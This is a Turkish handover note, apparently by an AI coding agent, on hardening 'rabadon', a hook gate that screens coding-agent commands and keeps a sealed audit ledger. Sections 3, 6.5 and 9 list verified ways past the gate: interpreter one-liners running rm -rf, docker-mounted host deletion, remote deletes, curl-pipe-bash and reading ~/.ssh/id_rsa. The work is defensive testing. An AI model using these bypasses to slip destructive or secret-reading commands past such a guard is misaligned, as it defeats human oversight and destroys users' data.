DEVİR — rabadon, 4 Eylül 2026
Bu dosyayı okuyup KALDIĞIN YERDEN devam et.
Repo: ~/damla_projects_2026/rabadon   dal: main   son commit: a63b0c3 (push'lu)

================================================================
0. TEK CÜMLE
================================================================
Dört delik kapandı ve defterin mührü anahtarlandı; ama bu oturumun asıl
dersi kod değil YÖNTEM: "delik" diye gelen beş iddianın dördü ölçünce
delik çıkmadı, ve benim kendi düzeltmem operatörün canlı defterini üç
dakikalığına yaraladı. Ölçmeden kural yazma.

================================================================
1. BU OTURUMDA NE YAPILDI — DÖRT COMMIT
================================================================
0b594a0  init salt-okunur dizinde ham stack trace basmıyor; exit 3, sebep
         errno'dan okunuyor (EACCES/EROFS/ENOSPC ayrı ayrı), bilinmeyen kod
         sebep UYDURMUYOR. Yeni suite: native/init_unwritable_test.sh (27).

82be15b  mv/cp ağaç dışında VAR OLAN bir dosyanın üstüne yazınca reddediliyor.
         Eksen "mv tehlikeli" değil, "hedef zaten dolu mu" — `> a.txt`nin
         kardeşi. Dizine taşıma, yeni isim, proje içi: hepsi serbest.
         native/git_verbs_test.sh bölüm 2b.

0832639  Deftere YAZMA da kurcalamadır. `echo x >> <gün>.jsonl` ve `sed -i`
         geçiyordu, `> <gün>.jsonl` reddediliyordu — aynı dosya, zıt karar.
         Supervision kontrolü append-atlamasının altındaydı, üstüne alındı.
         sed/perl/ruby eklendi ama SADECE in-place bayrağıyla; okuma her
         yerde serbest, defterin kendisi dahil.

a63b0c3  Zincir HMAC-SHA256 ile mühürleniyor, anahtar ~/.rabadon/chain.key
         (0600, /dev/urandom, O_EXCL, spool'un DIŞINDA). RFC 4231 vektör 1-2
         ile doğrulandı. İncelemenin 15 satırlık offline saldırısı artık
         BREAK alıyor. core/bus.mjs (4. yazıcı) da hizalandı.

================================================================
2. SAYILAR — HEPSİ BU MAKİNEDE ÖLÇÜLDÜ
================================================================
make test   : exit 0, 128 suite script, son tam koşuda 4210 "ok" satırı
git verbs   : 44 ok / 0 fail
baseline    : 90 ok / 0 fail
audit       : 47 ok / 0 fail
make deps   :  7 ok / 0 fail
npm         : latest 0.2.5 (2 Eyl yayınlandı), next 0.2.3-rc.1 (bayat etiket)
GitHub      : 0 yıldız, repo 24 Tem'den beri public

GERİ-ALMA KANITLARI (her düzeltme gerçekten tutuluyor):
  mv kuralı geri alınınca            44 ok -> 42 ok / 2 fail
  ilgililik filtresi satırı silinince 44 ok -> 42 ok / 2 fail
  append düzeltmesi geri alınınca    90 ok -> 4 fail
  in-place editör bloğu silinince    90 ok -> 2 fail
  HMAC mührü geri alınınca           47 ok -> 13 fail
  gün-ortası koruması silinince      47 ok -> 1 fail

================================================================
3. AÇIK KALANLAR — KOD
================================================================
- GIT_CONFIG_COUNT / GIT_CONFIG_KEY_0 env çiftleri hâlâ bypass (gitcfg.h'de
  ADLANDIRILMIŞ sınır, kapatılmadı).
- python3 -c "subprocess.run(...)" ve kardeşleri (perl -e, ruby -e, node -e)
  — parser shell'i okuyor, yorumlayıcı içindeki çağrıyı değil. threat-model'de
  yazılı. Bu sınıfın cevabı gate değil kernel fence.
- cd .. && rm -rf $(basename $PWD) — $(...) çözülemediği için WAIVED.
- alias..lead (boş alt-bölüm) — config_key "alt-bölüm yok" ile "boş alt-bölüm"ü
  ayırt etmiyor. Oracle bunu sayıyor, gizlemiyor.
- Task / WebFetch / mcp__* araçları HİÇ kapıdan geçmiyor: sadece Bash, Write,
  Edit yargılanıyor. Bir subagent ya da MCP sunucusu tamamen serbest.
  (DOĞRULANMADI — inceleme iddiası, ben koşturmadım.)

================================================================
4. AÇIK KALANLAR — DEFTER (3 EYLÜL YARASI)
================================================================
~/.rabadon/spool/2026-09-03.jsonl satır 10736..10847 (112 satır, 01:02:29-
01:05:48) HMAC ile, gerisi düz sha256 ile mühürlü. `rabadon audit` bu dosyaya
BREAK diyor.

BU KURCALAMA DEĞİL, ARAÇ HATASI — ve BENİM hatam: anahtarı çalışan bir gün
dosyasının ortasında tanıttım. Hiçbir satır silinmedi/değiştirilmedi/sırası
bozulmadı. Yanına 2026-09-03.NOTE.txt yazıldı: ne oldu, hangi satırlar, neden
düzeltilmedi.

DÜZELTİLMEDİ, ÇÜNKÜ: sidecar'ı yeniden hesaplayıp o 112 prev alanını yeniden
yazmak tam olarak `rabadon audit`in yakalamak için var olduğu işlem. Kendi
raporunu temiz göstermek için yapmak bu defterin varlık sebebine ihanet.

Tasarım düzeltildi: bir gün dosyası AÇILDIĞI mührü sonuna kadar korur. Canlı
makinede doğrulandı — anahtar var (01:05) ama bugünün sidecar'ında hmac işareti
YOK. Gün dönünce temiz başlar. Diğer 10 gün dokunulmadan INTACT.

================================================================
5. NASIL ÇALIŞ — BU OTURUMDA ÖĞRENİLEN (EN ÖNEMLİ BÖLÜM)
================================================================
5.1 GATE'İ ÇAĞIRIRKEN DÖRT TUZAK. Herhangi biri atlanırsa ölçüm ANLAMSIZ:
    - hook_event_name ZORUNLU. Yoksa gate her şeye exit 0 der. Ben bu tuzağa
      düştüm ve "rabadon hiçbir şey durdurmuyor" tablosu üretecektim.
    - session_id HER ÇAĞRIDA farklı olmalı. loop-stop 3. aynı komutu aynı
      exit 2 ile reddediyor; sabit id "kural reddetti" gibi görünüyor.
    - Lab /tmp ALTINDA OLMAMALI. pathres.h temp altındaki her şeyi "disposable"
      sayıyor, ağaç-dışı iniş üretilemiyor, test kendini kandırıyor.
    - Lab yolunda "rabadon" kelimesi GEÇMEMELİ. word_could_name_law operandda
      guard dosyası adı görünce segmenti relevant yapıyor — fixture kendi
      test ettiği kuralı kurtarıyor. Bu bana bir kez oldu: filtre satırını
      silsem bile test yeşil kalıyordu.

5.2 GERİ-ALMA KANITI OLMADAN YEŞİL SUITE DEĞERSİZ. Her düzeltme için
    "kuralı geri alınca kaç test kırmızı" ölç ve commit mesajına yaz. Bu
    oturumda iki kez fix'in yarısının korumasız olduğunu böyle yakaladım.

5.3 ÖNCÜL BEKÇİSİ KOY. Bir bölümün varsayımı (ör. "bu yol gerçekten ağaç
    dışı") ölçülmeden geçilirse, bölüm sonsuza kadar sahte yeşil verir.
    git_verbs_test.sh 2b önce `rm -rf` orada gerçekten reddediliyor mu diye
    soruyor, sonra kendi iddialarını ölçüyor.

5.4 "DELİK" DİYE GELEN ŞEYİ ÖNCE ÖLÇ. Bu oturumda dış incelemenin beş git
    deliğinin DÖRDÜ delik değildi:
      git reset --hard HEAD~5   -> reflog'dan TAM geri alındı (ölçtüm)
      git update-ref/branch -f/checkout -B -> hepsi reflog bırakıyor
      --force=yes, \git, find -exec -> zaten reddediliyordu
    Ve git_verbs_test.sh:184 `reset --hard HEAD~1`i BİLEREK must_not_block
    yazmış. Ölçülmüş bir karar, delik değil.

5.5 make test ile make ÜST ÜSTE BİNMESİN (önceki devirden, hâlâ geçerli).
    Ayrıca: audit.cpp'ye chain.h ekleyince Makefile bağımlılığını da ekle —
    make_deps_test.sh bu oturumda beni yakaladı, dört kural eksikti.

5.6 ZAMANLAMA TESTLERİ TAM SUITE ALTINDA SAPIYOR. day_cache_test.sh forked
    child'ı 64us ölçüp kırmızı verdi (sınır 50). Tek başına üç koşuda
    25/21/22us. "Herhalde flake" deme, tam suite'i tekrar koştur.

================================================================
6. DIŞ İNCELEME — NE BULDU, NEYİ YANLIŞ BULDU
================================================================
Üç tarafsız ajan koştu (SF/pazar, teknik derinlik, dağıtım). Doğrulanmış
bulgular:

DOĞRU ÇIKANLAR:
- @anthropic-ai/sandbox-runtime GERÇEK ve yayında (v0.0.75). Kernel izolasyonu
  bedava, Seatbelt+bubblewrap, MCP sunucuları ve hook'lar dahil.
- Kalabalık gerçek: AgentJail 86 yıldız (Go, Haziran), dwarvesf/claude-guardrails
  33, ve bir düzine 0-5 yıldızlı benzeri.
- Kategori gerçek: Invariant Labs -> Snyk, Lakera -> Check Point (~$300M),
  CodeIntegrity $5M seed, YC W26'da 3 ajan-güvenlik girişimi.
- README'nin başlığı "kernel enforcement" ve o ARTIK farklılaştırıcı değil.

YANLIŞ ÇIKANLAR (ben ölçtüm):
- "Anthropic moat'ı yedi" -> ÖLÇÜM YALANLADI. Aynı komutları ikisine verdim,
  gerçekçi kurulumla (proje yazılabilir, ajanın çalışması için şart):
     git push --force origin main   srt: İZİN VERDİ   rabadon: exit 2
     git reset --hard origin/main   srt: İZİN VERDİ   rabadon: exit 2
     rm -rf ~/Documents             srt: İZİN VERDİ   rabadon: exit 2
     git commit --no-verify         srt: İZİN VERDİ   rabadon: exit 2
     assertion silme (sed)          srt: İZİN VERDİ   rabadon: kural varsa
  srt NEREYE yazdığına bakıyor, NE ANLAMA geldiğine değil. Farklı katman.
  Maliyeti de var: Linux'ta bubblewrap ZORUNLU, MITM proxy + CA sertifikası,
  Windows'ta ayrı kullanıcı hesabı, sertifika iptali kırılıyor, nvm/pip --user
  erişilemiyor. rabadon: 2.78 ms, kurulum izi yok.
- "1005 commit'in yazarı boş" -> YANLIŞ. Hepsi nosey-dewdrop <damummyphus@gmail.com>.
- 8 bypass iddiasının 3'ü yanlıştı (--force=yes, \git, find -exec reddediliyor).

AJANLARIN ORTAK TEŞHİSİ (ikisi bağımsız olarak):
  "Güçlü parser, ince politika." Parser gerçek (heredoc, fonksiyon lifting,
  subshell, for-döngüsü bağlama) ama az sayıda kuralı koruyor. Ve en değerli
  parça — kurcalanma-kanıtlı defter — README'de en az anlatılan yer.

================================================================
6.5 BU OTURUMUN SONUNDA SALINAN AJANLAR — DOĞRULANMIŞ BULGULAR
================================================================
Üç ajan koştu. Her iddiayı ben tekrar koşturdum; yanlış çıkanları işaretledim.

A) BYPASS AVCISI — hepsini doğruladım, HEPSİ AÇIK:

  YORUMLAYICI EKSENİ (en geniş, tek eksende sınırsız yazım):
    perl -e 'system("rm -rf <dir>")'              exit 0
    node -e 'require("fs").rmSync(d,{recursive:1})' exit 0
    ruby -e 'FileUtils.rm_rf(...)'                exit 0
    awk 'BEGIN{system("rm -rf ...")}'             exit 0
    php -r "system(...)"                          exit 0  (ajan ölçtü)
    + zaten bilinen python3 -c
  Ajan gerçekten SİLDİ ve geri alınamadığını kanıtladı (git yok, md5 kayboldu).

  YERİNDE ÜSTÜNE YAZMA (ağaç DIŞINDA, silme listesinde olmayan fiiller):
    tee <dosya> < /dev/null                       exit 0  (dosya boşaldı)
    sed -i '' 's/./X/g' <dosya>                   exit 0  (md5 değişti)
  NOT: proje İÇİNDE ikisi de serbest — doğru davranış, ben ayrıca ölçtüm.

  UZAK/KONTEYNER ERİŞİMİ:
    docker run -v /Users/x:/h alpine rm -rf /h/... exit 0  (host baytları)
    ssh host rm -rf /data / kubectl delete ns prod / aws s3 rm --recursive
    gh repo delete --yes                           hepsi exit 0

  KAPALI ÇIKAN EKSENLER (tekrar test etme, ajan ölçtü):
    sh -c / bash -c / env / nice / timeout / xargs  -> gate içine bakıyor, 2
    symlink, ~/, "$HOME/", değişken atama, ./../    -> çözülüyor, 2
    > dosya, : > dosya, dd of=, truncate, rsync --delete, cp /dev/null -> 2
    reset --hard HEAD~1 (reflog), reflog expire, gc --prune, branch -D -> 2

B) YANLIŞ-RET ÖLÇÜMÜ — 5 yabancı repo (flask, fd, chalk, jq, fzf):
   298 komut, 0 ret, %0.0. Komutlar uydurulmadı: CI workflow, Makefile,
   package.json scripts, tox, pre-commit, CONTRIBUTING'den çıkarıldı.
   Liste: scratchpad/fp-commands.txt (298 satır, repo<TAB>komut).

   Tehlikeli görünüp masum olanların hepsi geçti: rm -rf node_modules,
   rm -rf build/, git clean -fd, git reset --hard HEAD, sed -i kaynak
   dosyada, find -delete, ve dangerous-string-in-text
   (git commit -m "guard against rm -rf", grep -rn "push --force").

   AMA AJANIN KENDİ UYARISI ÖNEMLİ: "gevşek bir kapıda %0 yanlış-ret,
   sıkı bir kapıdaki %0'dan daha zayıf sinyal." Doğru. Bu sayı sadece
   yanlış-ret tarafını ölçüyor.

   AJANIN 7 "İZİN VERİLİYOR" İDDİASINDAN 2'Sİ YANLIŞTI (ben ölçtüm):
     rm -rf ../sibling      -> ajan 0 dedi, GERÇEKTE 2 (reddediliyor)
     git branch -D main     -> ajan 0 dedi, GERÇEKTE 2 (reddediliyor)
   Doğru çıkan 5'i:
     rm -rf <proje>/src (mutlak yolla kendi kaynağı)  -> 0
     git push origin --delete old-branch              -> 0
     cat ~/.ssh/id_rsa                                -> 0
     curl -sL https://example.com | bash              -> 0
     chmod -R 777 /                                   -> 0

   ÖLÇÜLMEYEN: heredoc'lar, bare cd, $(...) dış form, Bash DIŞINDA hiçbir
   tool_name (Read/Write/Edit gating tamamen ölçülmedi), PostToolUse.
   DOĞRULANMADI: guard.json'suz kontrol koşusu yapılmadı — %0'ın config
   yüzünden olmadığı ayrıca kanıtlanmadı (ama config'li halde force-push
   hâlâ 2 verdiği için artefakt olma ihtimali zayıf).

================================================================
7. SIRADAKİ İŞ — ÖNCELİK SIRASIYLA
================================================================
A) YORUMLAYICI EKSENİ. Tek eksende sınırsız yazım: perl/node/ruby/awk/php
   -e ve -c bayrakları. Bugün hepsi exit 0 ve ajan gerçekten sildi.
   ÖNCE KARAR VER, SONRA KOD: bu eksen gate ile kapatılabilir mi, yoksa
   cevabı kernel fence mi? Çünkü "yorumlayıcıyı reddet" demek `node -e` ile
   build script çalıştıran her projeyi kırar. Muhtemel doğru şekil:
   yorumlayıcı + string bayrağı + string İÇİNDE yıkıcı bir fiil adı geçiyorsa.
   Ölçmeden yazma; ikizleri önce kur (node -e ile ordinary build, perl -e
   ile ordinary text işleme MUTLAKA geçmeli).

B) tee/sed -i AĞAÇ DIŞINDA. `mv/cp` için yazdığın baseline-overwrite-outside
   kuralının kardeşi. Bu daha dar ve daha net: hedef ağaç dışında VAR OLAN
   bir dosyaysa reddet. Proje içi kullanım serbest kalmalı (ölçtüm, bugün
   serbest). Yarım günlük iş.

C) README'yi ölçüme göre güncelle — bkz. bölüm 8, 12 madde, öncelik sırasıyla.
   En kritik üçü: (1) satır 132'nin "bir günü toptan yeniden yazabilir"
   itirafı ARTIK YANLIŞ, (2) mühür SHA-256 değil HMAC ve sidecar 3 alanlı,
   (3) audit çıkış kodu sözleşmesi eksik — README "0 veya 2" diyor ama
   BU MAKİNEDE exit 1 dönüyor.

   C-ÖNCESİ ACİL: exit 1 meselesi README hatası DEĞİL, canlı durum.
   Bugün `rabadon audit` çalıştıran biri TAMPER verdisi ve README'nin
   "olamaz" dediği bir çıkış kodu alıyor. Seçenekler:
     - 2026-09-03.jsonl'i olduğu gibi bırak, NOTE.txt yanında dursun,
       README'ye üç değerli sözleşmeyi yaz (dürüst, ama yeni okuyucu
       ilk koşuda kırmızı görür)
     - o günü arşive taşı (spool dışına), audit temiz dönsün, NOTE.txt
       arşivle birlikte gitsin
   İKİNCİSİNİ SEÇERSEN: dosyayı SİLME, taşı. Silmek tam da audit'in
   yakalamak için var olduğu şey.

D) Task/WebFetch/mcp__* kapı dışında mı — DOĞRULA, sonra karar ver.
   Sadece Bash/Write/Edit yargılanıyorsa, bir subagent tamamen serbest
   demektir ve bu "ajanı denetliyorum" iddiasının ortasında boşluk.

E) UZAK ERİŞİM (docker -v, ssh, kubectl, aws s3 rm). Bunlar kapsam kararı,
   kod kararı değil: rabadon yerel ağacı mı koruyor, yoksa ajanın her
   eylemini mi? Cevap "yerel" ise threat-model'e AÇIKÇA yaz, delik olarak
   sayma. Cevap "her eylem" ise bu ayrı bir üründür.

================================================================
8. README — ÖLÇÜMLE ÇELİŞEN YERLER (ajan raporu, kritikleri doğruladım)
================================================================
Öncelik sırası. İlk üçü ben tekrar ölçtüm, doğru çıktı.

1. SATIR 132 — "What it does not do: anyone who can write both the day file
   and its sidecar can rewrite a day wholesale."
   BU ARTIK YANLIŞ ve dosyanın en yanıltıcı satırı. a63b0c3 tam bu saldırıyı
   kapattı, audit_test.sh 47/47 ve içinde "the offline rewrite is convicted"
   var. Kendini KÜÇÜMSEYEN bir yanlış — ve bu projenin sattığı şey dürüstlük
   olduğu için, eksik itiraf da fazla iddia kadar zarar veriyor.
   Doğru yeni cümle: tamper-PROOF değil (diski elinde tutan anahtarı da tutar),
   ama OFFLINE yeniden yazma artık çalışmıyor.

2. SATIR 132 — "prev = the SHA-256 of the line before it" + "commits TWO facts"
   Mühür HMAC-SHA256 (chain.h:249, sha256.h:112). Sidecar ÜÇ alan taşıyor:
   <hash> <count> hmac. Diskte doğrulandı: 09-04 dosyası "... 275 hmac",
   09-03 dosyası işaretsiz (eski kuralla mühürlü, kasten).

3. SATIR 132 — audit çıkış kodu sözleşmesi EKSİK.
   README "0 veya 2" diyor. GERÇEK ÜÇ DEĞERLİ (audit.cpp:31-32):
   0 = hepsi doğrulandı, 1 = en az bir kırık, 2 = kırık yok ama doğrulanamayan var.
   BEN ÖLÇTÜM: bu makinede `rabadon audit` -> exit 1. Yani README'nin
   "olamaz" dediği kod, dokümante edilen komutu çalıştıran okuyucuya dönüyor.
   (Sebebi 3 Eylül yarası — bölüm 4.)

4. SATIR 11 — "Eleven laws are compiled in ... any of the eleven off by id"
   GERÇEK 13. Ben saydım. Ve bu 15 Ağustos'tan beri bayat (11 -> 12 -> 13).
   Aynı bayat sayı native/rules.h:12'de "three compiled-in laws" olarak da var.

5. SATIR 11 — "Every event is chained by SHA-256" — kendini küçümsüyor (HMAC).

6. SATIR 20 — "an append-only ledger" — 0832639'dan sonra ters yönde bayat:
   spool'a append artık REDDEDİLİYOR.

7. SATIR 11 — adlandırılmış kural listesi baseline-overwrite-outside'ı atlıyor.

8. SATIR 130 — "the three laws compiled into the binary" — 4 numaranın aynısı.

9. SATIR 96 — loop-stop "the same command 3x": read-only komutlar MUAF
   (gate.cpp:5778). Okuyucu `echo` ile test ederse çalışmadığını sanır.

10. SATIR 40 — "~23k lines of dependency-free C++" — GERÇEK 26.484. Ben saydım.
    Kendini küçümseyen bir yanlış.

11. SATIR 31-33 — init bloğu exit 3 / yazılamayan dizin yolunu hiç anmıyor.

12. SATIR 162 — komut listesi: `rabadon wrong` metinde iki kez geçiyor ama
    listede yok. Ayrıca 19 dispatch edilen verb README'de yok (eksiklik,
    fazla iddia değil).

DOĞRULANAN (değiştirme, doğru):
  ~2.8 ms iddiası — ajan 60 gerçek gate süreciyle ölçtü: medyan 2.98 ms,
  p95 3.96. Dürüst. (gate_bench.sh'ın 241µs'i süreç-içi yargı, farklı şey.)
  Dört adlandırılmış kural gerçekten ateşleniyor. Üç mühürlü id doğru.
  26 komutun hepsi dispatcher'da var. npm 0.2.5 gerçek.

DOĞRULANMADI (ajan da koşturmadı, sen koştur):
  520 reddedildi / 90.274 gated / %0.8 / haftada 9.9 — bench/*.py ile
  yeniden üretilmeli, ve spool'daki kırık gün bunu bozabilir.
  docs/threat-model.md:112 "no key the writer lacks" — README:132 buraya
  link veriyor, yani bayat iddia bir tık ötede.

================================================================
9. BİR SONRAKİ SESSION İÇİN ORKESTRASYON PROMPTU
================================================================
Bu oturumda çok-ajanlı orkestrasyon işe yaradı ve NEDEN işe yaradığı önemli:
ajanlara TARAF SEÇTİREN değil AMACA YÖNELİK sorular soruldu, ve her bulgu
ana oturumda tekrar ölçüldü. İki ajanın toplam 15 iddiasından 5'i yanlıştı.
Ölçmeden aktarma.

KURAL 1 — SORU ŞEKLİ. Ajana "bu iyi mi / değer mi / yapmalı mıyım" SORMA.
  Kötü: "rabadon iyi bir ürün mü?"  -> ajan taraf seçer, sen de ona uyarsın
  İyi:  "şu 40 komutu şu binary'ye ver, hangileri exit 0 döndü, ve her biri
         için geri alınamaz olduğunu nasıl kanıtladın?"
Ajan ÖLÇÜM getirsin, KARAR değil. Kararı sen ve Damla verir.

KURAL 2 — HER AJANA HARNESS TUZAKLARINI YAZ. Yazmazsan ölçümü çöp olur.
Bu paragrafı prompta AYNEN kopyala:

  printf '{"hook_event_name":"PreToolUse","session_id":"t-RANDOM","cwd":"<dir>",
  "tool_name":"Bash","tool_input":{"command":"<cmd>"}}' | ./native/rabadon-gate
  1. hook_event_name ZORUNLU — yoksa gate her şeye exit 0 der.
  2. session_id HER ÇAĞRIDA farklı — loop-stop 3. aynı komutu exit 2 ile
     reddeder, sabit id sahte "kural reddetti" üretir.
  3. Lab /tmp altında OLMASIN — temp altı "disposable" sayılır, ağaç-dışı
     iniş üretilemez. $HOME altında mktemp -d kullan, sonra SİL.
  4. Lab yolunda "rabadon" kelimesi GEÇMESİN — word_could_name_law fixture'ı
     kurtarır.
  5. export RABADON_DIR=$LAB/rb; mkdir -p $RABADON_DIR/spool;
     printf 'on\n' > $RABADON_DIR/enabled; guard.json:
     {"project":"p","bash":[],"protectedPaths":[],"disabled":[]}
  ÖNCE HARNESS DOĞRULA: force-push -> 2, git status -> 0. Tutmuyorsa dur.

KURAL 3 — PARALEL VE DAR. Üç ajan aynı anda, her biri TEK konuda, birbirinin
dosyasına dokunmadan. Context şişmesin diye ana oturum ajanların transcript
dosyasını OKUMAZ; sadece son raporu alır ve iddiaları kendi koşturur.

KURAL 4 — HER AJANDAN "NE BULAMADIM" İSTE. "Hangi eksenleri denedin ve
KAPALI buldun" sorusu, açık bulduklarından bazen daha değerli — tekrar test
etmeni engeller.

BU SESSION'DA KULLANILAN ÜÇ AJAN ŞEKLİ (tekrar kullanılabilir):
  1. BYPASS AVCISI: "eksene göre çalış, tek tek numara sayma. Her bulgu için
     komut + exit kodu + geri alınamazlığın KANITI + hangi eksen. Kapalı
     bulduğun eksenleri de yaz."
  2. YANLIŞ-RET ÖLÇÜMÜ: "5-6 yabancı repo klonla, komutları UYDURMA — repo'nun
     kendi CI/Makefile/package.json/CONTRIBUTING dosyalarından çıkar. En az
     200 komut. Her reddi rule id ile bildir. Emin olamadıklarını AYRI ver."
  3. DOKÜMAN DENETİMİ: "şu commit'ler neyi değiştirdi, README'nin hangi
     cümlesi artık yanlış? Cümleyi alıntıla, kodun ne yaptığını file:line ile
     göster. Düzeltme metni YAZMA, ben yazacağım."


================================================================
10. DAMLA'NIN SORUSU
================================================================
Bu oturumda soru DEĞİŞTİ. Artık "kaç kişi kullanıyor" değil:

  "kanka olay how big is it. güzel ürün satar. iyiyse güzelse yok yoksa
   satarız yoksa flop."

Yani kullanıcı sayısı SONUÇ, sebep değil. Ölçülen kısmı şu:

- Wrapper testi GEÇTİ. Üç ajan bağımsız olarak "bir günde yapılamaz" dedi.
  15.957 satır gerçek kod (26k'nın 8.828'i yorum), 128 test dosyası,
  32.945 satır test. Test paketi motordan büyük.
- Kalabalık gerçek: AgentJail 86 yıldız, dwarvesf 33, bir düzine 0-5.
- AMA kalabalıkta kimse KOMUTUN ANLAMINI okumuyor. Hepsi ya izolasyon
  (sandbox-runtime, AgentJail'in Landlock kısmı) ya regex deny listesi.
  cmdtext.h heredoc, fonksiyon lifting, subshell, for-döngüsü bağlama
  çözüyor. Ayrım orada ve README onu anlatmıyor.
- Ajanların ortak teşhisi: "güçlü parser, ince politika." Parser az sayıda
  kuralı koruyor. Bu oturumda politika biraz kalınlaştı (4 kural), ama
  yorumlayıcı ekseni hâlâ açık.

CEVAP HENÜZ TAM DEĞİL. Tamamlamak için gereken tek ölçüm: yabancı bir
makinede, yabancı bir kod tabanında, bir hafta. Bu oturumda 5 yabancı REPO
ölçüldü (298 komut, 0 yanlış ret) ama hâlâ TEK OPERATÖR, TEK MAKİNE.
